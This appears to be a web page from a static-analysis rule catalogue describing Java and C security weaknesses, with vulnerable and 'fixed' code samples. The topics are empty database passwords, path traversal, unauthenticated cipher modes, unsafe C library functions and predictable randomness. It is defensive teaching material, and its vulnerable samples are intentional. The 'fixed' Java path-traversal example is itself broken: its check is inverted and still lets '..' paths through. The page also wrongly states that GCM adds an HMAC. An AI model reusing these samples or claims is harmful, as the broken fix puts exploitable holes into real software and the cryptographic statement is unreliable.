                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7065">Empty database password</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Empty database password</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>This code creates a database connect using a blank or empty password. This indicates that the database is not protected by a password.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0086">Path Traversal Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-example-1">Fixed Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed Code Example 2</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</p>
<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</p>
<p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
<p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</p>
<p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">path_traversal</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> <span class="c1">// @@bad@@</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>The vulnerable code example does not validate the file_path of the external input and may trigger a path traversal vulnerability.</p>
<h3 id="fixed-example-1">Fixed Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">bool</span> <span class="nf">verify_file_path</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">path_traversal</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">verify_file_path</span><span class="p">(</span><span class="n">file_path</span><span class="p">)){</span> <span class="c1">// @@good@@</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In the vulnerability code repair example, by calling the verify_file_path () function, the path is effectively verified, and the path traversal vulnerability can be prevented.</p>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testbad</span><span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">is1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="n">InputStream</span> <span class="n">is2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">128</span><span class="o">];</span>
            <span class="n">is1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"filepath"</span><span class="o">);</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">file_path</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">128</span><span class="o">);</span>
      <span class="n">is2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">));</span>  <span class="c1">// @@bad@@</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">E</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="n">is2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The vulnerable code example does not validate the file_path of the external input and may trigger a path traversal vulnerability.</p>
<h3 id="fixed-code-example-2">Fixed Code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testgood</span><span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">verify_file_path</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span><span class="o">){</span>
    <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">".."</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">is1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="n">InputStream</span> <span class="n">is2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">128</span><span class="o">];</span>
            <span class="n">is1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"filepath"</span><span class="o">);</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">file_path</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">128</span><span class="o">);</span>
      <span class="k">if</span><span class="o">(!</span><span class="n">verify_file_path</span><span class="o">(</span><span class="n">file_path</span><span class="o">)){</span>  <span class="c1">// @@good@@</span>
        <span class="k">return</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="n">is2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">E</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="n">is2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>In the vulnerability code repair example, by calling the verify_file_path () function, the path is effectively verified, and the path traversal vulnerability can be prevented.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE23">
<p>http://cwe.mitre.org/data/definitions/23.html <a class="footnote-backref" href="#fnref-CWE23" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT-FIO16-J">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them <a class="footnote-backref" href="#fnref-CERT-FIO16-J" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-CERT-FIO02-C">
<p>https://wiki.sei.cmu.edu/confluence/display/c/FIO02-C.+Canonicalize+path+names+originating+from+tainted+sources <a class="footnote-backref" href="#fnref-CERT-FIO02-C" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">Java</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7565">Cipher with no integrity</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Cipher with no integrity</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    The ciphertext produced is susceptible to alteration by an adversary. This mean that the cipher provides no way to detect that the 
    data has been tampered with. If the ciphertext can be controlled by an attacker, it could be altered without detection.
</p>
<p>
    The solution is to used a cipher that includes a Hash based Message Authentication Code (HMAC) to sign the data. Combining a HMAC function to the 
    existing cipher is prone to error <sup><a href="http://www.thoughtcrime.org/blog/the-cryptographic-doom-principle/">[1]</a></sup>. Specifically,
    it is always recommended that you be able to verify the HMAC first, and only if the data is unmodified, do you then perform any cryptographic
    functions on the data.
</p>
<p>The following modes are vulnerable because they don't provide a HMAC:<br/>
    - CBC<br/>
    - OFB<br/>
    - CTR<br/>
    - ECB<br/><br/>
    The following snippets code are some examples of vulnerable code.<br/><br/>
<b>Code at risk:</b><br/>
<i>AES in CBC mode</i><br/></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>&lt;pre&gt;Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
</pre></div>
</td></tr></table>
<p>c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</p></p>
<br/>
<i>Triple DES with ECB mode</i><br/>
<pre>Cipher c = Cipher.getInstance("DESede/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
<p></p>
<p>
<b>Solution:</b>
<pre>Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p>
<p>
In the example solution above, the GCM mode introduces an HMAC into the resulting encrypted data, providing integrity of the result.
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://en.wikipedia.org/wiki/Authenticated_encryption">Wikipedia: Authenticated encryption</a><br/>
<a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01">NIST: Authenticated Encryption Modes</a><br/>
<a href="http://www.thoughtcrime.org/blog/the-cryptographic-doom-principle/">Moxie Marlinspike's blog: The Cryptographic Doom Principle</a><br/>
<a href="http://cwe.mitre.org/data/definitions/353.html">CWE-353: Missing Support for Integrity Check</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1114">Dangerous standard library functions</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and Risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Some standard library function was designed without foreseeing some security vulnerability, you should use the listed standard library functions with caution, or totally refuse to use them.</p>
<p>The vulnerable standard library functions:</p>
<table>
<thead>
<tr>
<th>Function</th>
<th>Risk</th>
<th>Solution</th>
</tr>
</thead>
<tbody>
<tr>
<td>gets</td>
<td>Critical</td>
<td>Do not use gets(buf), use fgets(buf, size, stdin) instead</td>
</tr>
<tr>
<td>strcpy</td>
<td>High</td>
<td>Check the buffer size first, or use strncpy, or allocate buffer dynamically</td>
</tr>
<tr>
<td>strcat</td>
<td>High</td>
<td>Use strncat instead</td>
</tr>
<tr>
<td>sprintf</td>
<td>High</td>
<td>Use snprintf, or specify the precision</td>
</tr>
<tr>
<td>scanf</td>
<td>High</td>
<td>Specify the precision, or parse it yourself</td>
</tr>
<tr>
<td>sscanf</td>
<td>High</td>
<td>Specify the precision, or parse it yourself</td>
</tr>
<tr>
<td>fscanf</td>
<td>High</td>
<td>Specify the precision, or parse it yourself</td>
</tr>
<tr>
<td>vfscanf</td>
<td>High</td>
<td>Specify the precision, or parse it yourself</td>
</tr>
<tr>
<td>vsprintf</td>
<td>High</td>
<td>Use vsnprintf, or specify the precision</td>
</tr>
<tr>
<td>vscanf</td>
<td>High</td>
<td>Specify the precision, or parse it yourself</td>
</tr>
<tr>
<td>vsscanf</td>
<td>High</td>
<td>Specify the precision, or parse it yourself</td>
</tr>
<tr>
<td>streadd</td>
<td>High</td>
<td>Make sure the allocated target buffer is four times as big as the source buffer</td>
</tr>
<tr>
<td>strecpy</td>
<td>High</td>
<td>Make sure the allocated target buffer is four times as big as the source buffer</td>
</tr>
<tr>
<td>strtrns</td>
<td>High</td>
<td>Check if the target buffer can hold the source string</td>
</tr>
<tr>
<td>getenv</td>
<td>High</td>
<td>Do not assume the envvar is of limited length</td>
</tr>
<tr>
<td>realpath</td>
<td>High (or a bit lower, depending on the implementation)</td>
<td>Allocate the buffer with size PATH_MAX and manually check either input argument or output argument is within PATH_MAX</td>
</tr>
<tr>
<td>syslog</td>
<td>High (or a bit lower, depending on the implementation)</td>
<td>Truncate the string into a appropriate size before passing to a function</td>
</tr>
<tr>
<td>getopt</td>
<td>High (or a bit lower, depending on the implementation)</td>
<td>Truncate the string into a appropriate size before passing to a function</td>
</tr>
<tr>
<td>getopt_long</td>
<td>High (or a bit lower, depending on the implementation)</td>
<td>Truncate the string into a appropriate size before passing to a function</td>
</tr>
<tr>
<td>getpass</td>
<td>High (or a bit lower, depending on the implementation)</td>
<td>Truncate the string into a appropriate size before passing to a function</td>
</tr>
<tr>
<td>getchar</td>
<td>Medium</td>
<td>Check the boundaries of the buffer if you use this function inside a loop</td>
</tr>
<tr>
<td>fgetc</td>
<td>Medium</td>
<td>Check the boundaries of the buffer if you use this function inside a loop</td>
</tr>
<tr>
<td>getc</td>
<td>Medium</td>
<td>Check the boundaries of the buffer if you use this function inside a loop</td>
</tr>
<tr>
<td>read</td>
<td>Medium</td>
<td>Check the boundaries of the buffer if you use this function inside a loop</td>
</tr>
<tr>
<td>bcopy</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>fgets</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>memcpy</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>snprintf</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>strccpy</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>strcadd</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>strncpy</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
<tr>
<td>vsnprintf</td>
<td>Low</td>
<td>Make sure the target buffer size is no less than the specified size</td>
</tr>
</tbody>
</table>
<h1 id="vulnerability-and-risk">Vulnerability and Risk</h1>
<p>It may cause buffer overflow problem.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>High</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>use the listed standard library functions with caution, or totally refuse to use them.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span>void BadFunc(char *src)
{
    char *dst = new char[5];
    strcpy(dst, src);
    ...
}
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span>void GoodFunc(char *src, size_t srcLen)
{
    char *dst = new char[5];
    if(srcLen &lt; 5)
    {
        strcpy(dst, src);
    }
    ...
}
</pre></div>
</td></tr></table>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/cpp.html">CPP</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1083">Insecure Randomness</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Pseudorandom number generators (PRNGs) use deterministic mathematical algorithms to produce a sequence of numbers with good statistical properties. However, the sequences of numbers produced fail to achieve true randomness. PRNGs usually start with an arithmetic seed value. The algorithm uses this seed to generate an output value and a new seed, which is used to generate the next value, and so on.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The Java API provides a PRNG, the java.util.Random class. This PRNG is portable and repeatable. Consequently, two instances of the java.util.Random class that are created using the same seed will generate identical sequences of numbers in all Java implementations. Seed values are often reused on application initialization or after every system reboot. In other cases, the seed is derived from the current time obtained from the system clock. An attacker can learn the value of the seed by performing some reconnaissance on the vulnerable target and can then build a lookup table for estimating future seed values.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Use a more secure random number generator, such as the java.security.SecureRandom class.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example uses the insecure java.util.Random class. This class produces an identical sequence of numbers for each given seed value; consequently, the sequence of numbers is predictable.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.util.Random</span><span class="o">;</span>
<span class="c1">// ...</span>

<span class="n">Random</span> <span class="n">number</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Random</span><span class="o">(</span><span class="mi">123L</span><span class="o">);</span>
<span class="c1">//...</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="c1">// Generate another random integer in the range [0, 20]</span>
  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">number</span><span class="o">.</span><span class="na">nextInt</span><span class="o">(</span><span class="mi">21</span><span class="o">);</span>
  <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">n</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses the java.security.SecureRandom class to produce high-quality random numbers:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.security.SecureRandom</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.security.NoSuchAlgorithmException</span><span class="o">;</span>
<span class="c1">// ...</span>

<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span> <span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
  <span class="n">SecureRandom</span> <span class="n">number</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SecureRandom</span><span class="o">();</span>
  <span class="c1">// Generate 20 integers 0..20</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">number</span><span class="o">.</span><span class="na">nextInt</span><span class="o">(</span><span class="mi">21</span><span class="o">));</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/MSC02-J.+Generate+strong+random+numbers <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7477">Overly permissive CORS policy</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Overly permissive CORS policy</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
